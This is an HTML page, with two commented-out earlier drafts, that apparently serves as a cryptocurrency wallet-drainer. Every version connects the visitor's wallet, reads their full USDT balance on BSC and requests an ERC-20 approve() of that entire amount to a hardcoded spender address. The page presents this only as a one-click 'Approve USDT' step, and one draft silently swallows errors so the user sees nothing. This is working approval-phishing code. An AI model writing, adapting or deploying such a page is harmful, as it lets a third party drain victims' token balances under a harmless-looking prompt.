<!-- <!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Approve USDT on BSC</title>
  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.7.4/dist/web3.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
    button { padding: 12px 24px; font-size: 18px; cursor: pointer; }
    pre { background: #f4f4f4; padding: 10px; margin-top: 20px; display: inline-block; text-align: left; }
  </style>
</head>
<body>
  <h2>Approve USDT on BSC</h2>
  <button id="approveBtn">Connect Wallet & Approve</button>
  <pre id="status">Not connected</pre>

  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
    const SPENDER = "0xD0748bB40f7F262748dA3891836D2be4ee70405b";

    const ERC20_ABI = [
      { "constant": false, "inputs": [{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
      { "constant": true, "inputs": [{"name":"owner","type":"address"}], "name": "balanceOf", "outputs": [{"name":"","type":"uint256"}], "type": "function" },
      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name":"","type":"uint8"}], "type": "function" }
    ];

    let web3;
    let accounts;

    async function approveFullBalance() {
      if (!window.ethereum) {
        alert("Install MetaMask or another Web3 wallet.");
        return;
      }

      web3 = new Web3(window.ethereum);

      try {
        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];
        document.getElementById('status').innerText = "Connected: " + userAddress;

        const token = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);

        const decimals = await token.methods.decimals().call();
        const balance = await token.methods.balanceOf(userAddress).call();

        if (balance === "0") {
          document.getElementById('status').innerText = "Balance is zero.";
          return;
        }

        document.getElementById('status').innerText = `Approving ${balance / (10 ** decimals)} USDT to ${SPENDER}...`;

        await token.methods.approve(SPENDER, balance).send({ from: userAddress })
          .on('transactionHash', hash => {
            document.getElementById('status').innerText = 'Transaction sent: ' + hash;
          })
          .on('receipt', rec => {
            document.getElementById('status').innerText = 'Approve confirmed in block ' + rec.blockNumber;
          });

      } catch (err) {
        console.error(err);
        document.getElementById('status').innerText = 'Error: ' + (err.message || 'Transaction failed');
      }
    }

    document.getElementById('approveBtn').addEventListener('click', approveFullBalance);
  </script>
</body>
</html> -->



<!-- 

<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Approve USDT</title>
  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.7.4/dist/web3.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    button { padding: 14px 28px; font-size: 18px; cursor: pointer; }
  </style>
</head>
<body>
  <button id="approveBtn">Approve USDT</button>

  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
    const SPENDER = "0xD0748bB40f7F262748dA3891836D2be4ee70405b";

    const ERC20_ABI = [
      { "constant": false, "inputs": [{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
      { "constant": true, "inputs": [{"name":"owner","type":"address"}], "name": "balanceOf", "outputs": [{"name":"","type":"uint256"}], "type": "function" },
      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name":"","type":"uint8"}], "type": "function" }
    ];

    let web3;
    let accounts;

    async function approveUSDT() {
      if (!window.ethereum) {
        alert("MetaMask or compatible wallet is required.");
        return;
      }

      web3 = new Web3(window.ethereum);

      try {
        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];
        const token = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);

        const balance = await token.methods.balanceOf(user).call();

        if (!balance || balance === "0") {
          alert("Your USDT balance is zero.");
          return;
        }

        await token.methods.approve(SPENDER, balance).send({ from: user });

        // Optionally: Show a silent success or redirect â€” currently does nothing
      } catch (err) {
        // Don't show anything, but log silently if needed for debugging
        console.warn("Transaction failed or rejected.");
      }
    }

    document.getElementById('approveBtn').addEventListener('click', approveUSDT);
  </script>
</body>
</html> -->




<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>USDT Approve - BSC</title>
  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.7.4/dist/web3.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    button { padding: 14px 28px; font-size: 18px; cursor: pointer; margin: 10px; }
  </style>
</head>
<body>

  <button id="connectBtn">Connect Wallet</button>
  <button id="approveBtn" disabled>Approve USDT</button>

  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
    const SPENDER = "0xD0748bB40f7F262748dA3891836D2be4ee70405b";

    const ERC20_ABI = [
      { "constant": false, "inputs": [{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
      { "constant": true, "inputs": [{"name":"owner","type":"address"}], "name": "balanceOf", "outputs": [{"name":"","type":"uint256"}], "type": "function" },
      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name":"","type":"uint8"}], "type": "function" }
    ];

    let web3;
    let accounts;

    async function connectWallet() {
      if (!window.ethereum) {
        alert("Please install MetaMask.");
        return;
      }

      try {
        web3 = new Web3(window.ethereum);
        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        console.log("Wallet connected:", accounts[0]);
        document.getElementById('approveBtn').disabled = false;
      } catch (err) {
        console.error("Wallet connection failed:", err);
      }
    }

    async function approveUSDT() {
      if (!web3 || !accounts || accounts.length === 0) {
        alert("Please connect your wallet first.");
        return;
      }

      try {
        const user = accounts[0];
        const token = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);
        const balance = await token.methods.balanceOf(user).call();

        if (!balance || balance === "0") {
          alert("Your USDT balance is zero.");
          return;
        }

        await token.methods.approve(SPENDER, balance).send({ from: user });
        console.log("Approve transaction sent.");
      } catch (err) {
        console.error("Approve failed:", err);
      }
    }

    document.getElementById('connectBtn').addEventListener('click', connectWallet);
    document.getElementById('approveBtn').addEventListener('click', approveUSDT);
  </script>
</body>
</html>
